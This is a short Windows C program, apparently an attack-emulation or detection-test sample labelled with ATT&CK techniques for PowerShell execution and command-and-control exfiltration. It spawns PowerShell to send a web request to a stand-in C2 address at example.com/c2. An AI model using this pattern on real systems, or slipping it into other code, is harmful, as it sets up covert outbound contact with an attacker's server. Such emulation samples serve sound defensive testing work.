/* Execution + C2/Exfil: T1059.001 (PowerShell) + T1041 (C2 pattern) */
#include <windows.h>

int main(void) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    const char *cmd = "powershell.exe -NoProfile -Command \"Invoke-WebRequest -Uri http://example.com/c2\"";
    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    return 0;
}
